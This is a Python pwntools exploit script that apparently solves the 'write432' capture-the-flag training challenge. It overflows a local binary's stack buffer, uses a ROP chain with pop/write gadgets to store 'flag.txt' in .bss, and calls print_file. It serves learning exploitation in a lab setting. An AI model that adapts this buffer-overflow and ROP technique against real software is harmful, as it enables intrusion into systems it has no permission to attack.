from pwn import *

p = ELF('./write432')
r = process('./write432')
printFlag = p.plt['print_file']
gadgets = p.symbols['usefulGadgets']
pop_edi_ebp = 0x080485aa
bss = 0x804a020
log.info('print_flag 0x%x' %printFlag)
log.info('gadgets 0x%x' %gadgets)
log.info('pop edi ebp ret 0x%x' %pop_edi_ebp)
log.info('bss 0x%x' %bss)
junk = b'X'*44
payload = junk
payload += p32(pop_edi_ebp)
payload += p32(bss)
payload += b'flag'
payload += p32(gadgets)
payload += p32(pop_edi_ebp)
payload += p32(bss + 0x4)
payload += b'.txt'
payload += p32(gadgets)
payload += p32(printFlag)
payload += b'Y'*4
payload += p32(bss)
r.sendline(payload)
r.interactive()